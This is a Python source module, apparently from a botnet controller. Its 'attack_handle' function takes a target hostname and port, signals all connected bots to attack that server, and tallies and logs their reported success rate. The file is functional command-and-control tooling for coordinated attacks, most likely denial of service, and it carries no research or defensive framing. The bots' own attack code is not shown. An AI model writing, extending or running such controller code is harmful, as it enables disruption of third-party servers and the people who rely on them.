''' attack '''

import argparse

from ..utils import Logger

async def attack_handle(messenger, line):
    ''' Signal the bots to attack '''
    # Destructure line
    raw_args = line.split(' ')[1:]

    parser = argparse.ArgumentParser(description='Parse the attack command for the bots')
    parser.add_argument('host_name', help='the hostname of the target server', type=str)
    parser.add_argument('port', help='the port of the target server', type=int)
    args = parser.parse_args(raw_args)

    Logger.log('Issuing attack...')

    # Send the messaage to the server
    messenger.send_channel('attack {0} {1}'.format(args.host_name, args.port))

    # Collect responses & perform analytics
    responses = await messenger.read('attack')
    successes = sum('success' in response for response in responses)
    failures = sum('fail' in response for response in responses)
    try:
        result = '{}% ({}/{})'.format(
            float(successes) / float(successes + failures) * 100,
            successes,
            successes + failures)
    except ZeroDivisionError:
        result = '0% (No Bots)'

    # Report diagnostics
    Logger.logline()
    map(Logger.log, responses)
    Logger.log('Successful attacks: {}'.format(result))
    Logger.logline()
